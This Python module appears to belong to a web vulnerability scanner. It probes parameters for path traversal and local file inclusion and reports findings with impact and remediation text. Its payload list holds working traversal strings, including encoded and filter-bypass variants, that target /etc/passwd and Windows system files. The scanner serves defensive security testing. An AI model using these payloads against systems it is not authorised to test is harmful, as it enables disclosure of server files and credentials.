"""
Path traversal / LFI probe — detect local file inclusion via directory
traversal sequences.

Strategy:
  1. Inject traversal payloads (`../../../etc/passwd`, encoding variants)
     into parameters that look like they accept file paths.
  2. Check the response for well-known file-content markers.
  3. Confirm with a second, deeper traversal depth to rule out coincidence.

Non-destructive: only reads; never writes to the filesystem.
"""

from __future__ import annotations

from ..models import Finding
from .base import (
    BaseProbe,
    InjectionPoint,
    detect_path_traversal_content,
    inject_query_param,
)
from .discovery import FILE_PARAMS


class TraversalProbe(BaseProbe):
    name = "traversal"
    cwe = "CWE-22"
    max_requests = 30

    def probe(
        self,
        url: str,
        injection_points: list[InjectionPoint],
        body: str = "",
        headers: dict | None = None,
    ) -> list[Finding]:
        findings: list[Finding] = []

        # Prioritize parameters whose names suggest file operations
        sorted_pts = sorted(
            injection_points,
            key=lambda p: (0 if p.name.lower() in FILE_PARAMS else 1),
        )

        for pt in sorted_pts:
            if not self._can_request():
                break
            if pt.input_type in ("file", "checkbox", "radio", "submit", "button", "image"):
                continue

            finding = self._test_traversal(pt)
            if finding:
                findings.append(finding)

        return findings

    def _test_traversal(self, pt: InjectionPoint) -> Finding | None:
        for payload, target_file in _PAYLOADS:
            if not self._can_request():
                return None

            if pt.method == "POST":
                resp = self._send("POST", pt.target_url, data={pt.name: payload})
            else:
                test_url = inject_query_param(pt.target_url, pt.name, payload)
                resp = self._send("GET", test_url)

            if resp is None:
                continue

            body = resp.text[:300_000]
            match = detect_path_traversal_content(body)
            if match:
                marker, desc = match
                # Confirm with a deeper depth
                confirmed = self._confirm(pt, payload, marker)

                return self._finding(
                    title=f"Path traversal / LFI via '{pt.name}'",
                    severity="Critical" if "passwd" in target_file else "High",
                    category="Injection",
                    evidence=(
                        f"Payload `{payload}` in parameter '{pt.name}' returned "
                        f"content from {target_file}: \"{marker}\""
                    ),
                    impact=(
                        "An attacker can read arbitrary files from the server, "
                        "including configuration files, source code, and credentials. "
                        "In some cases this escalates to remote code execution."
                    ),
                    remediation=(
                        "Validate and sanitize file path inputs. Use an allowlist of "
                        "permitted files/directories. Avoid passing user input directly "
                        "to file-system APIs. Chroot or jail the application."
                    ),
                    url=str(resp.url),
                    confidence="high" if confirmed else "medium",
                    proof=f"Payload: {payload}\nResponse marker ({desc}): {marker}",
                    cwe="CWE-22",
                )

        return None

    def _confirm(self, pt: InjectionPoint, original_payload: str, marker: str) -> bool:
        """Re-test with an extra traversal depth to confirm it's real."""
        deeper = "../" + original_payload
        if pt.method == "POST":
            resp = self._send("POST", pt.target_url, data={pt.name: deeper})
        else:
            test_url = inject_query_param(pt.target_url, pt.name, deeper)
            resp = self._send("GET", test_url)

        if resp is None:
            return False
        return marker in resp.text[:300_000]


# (payload, target_file_description)
_PAYLOADS: list[tuple[str, str]] = [
    # Unix
    ("../../../etc/passwd",              "/etc/passwd"),
    ("../../../../etc/passwd",           "/etc/passwd"),
    ("../../../../../etc/passwd",        "/etc/passwd"),
    ("....//....//....//etc/passwd",     "/etc/passwd (filter bypass)"),
    ("..%2f..%2f..%2fetc%2fpasswd",      "/etc/passwd (URL-encoded)"),
    ("..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd (double-encoded)"),
    ("/etc/passwd",                       "/etc/passwd (absolute)"),
    # Windows
    ("..\\..\\..\\windows\\win.ini",                    "win.ini"),
    ("..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts"),
    ("....\\\\....\\\\....\\\\windows\\\\win.ini",      "win.ini (filter bypass)"),
]
